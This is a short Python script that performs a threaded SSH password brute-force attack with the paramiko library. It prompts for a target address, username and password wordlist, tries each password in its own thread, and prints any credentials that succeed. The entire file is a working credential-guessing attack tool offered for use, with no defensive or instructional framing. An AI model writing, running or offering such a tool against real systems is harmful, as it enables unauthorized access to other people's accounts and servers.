import paramiko, socket, sys, os, termcolor 
import threading, time

stop_flag = 0

def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        #Try connecting with username and password on port 22
        ssh.connect(host, port=22, username=username, password=password)
        #If successfull give signal for other threads to stop
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ' For account: ' + username), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account ' + username + ' * * *')

with open(input_file, 'r') as file:
    for line in file.readlines():
        #check to see if a valid password has been found, join threads if so
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
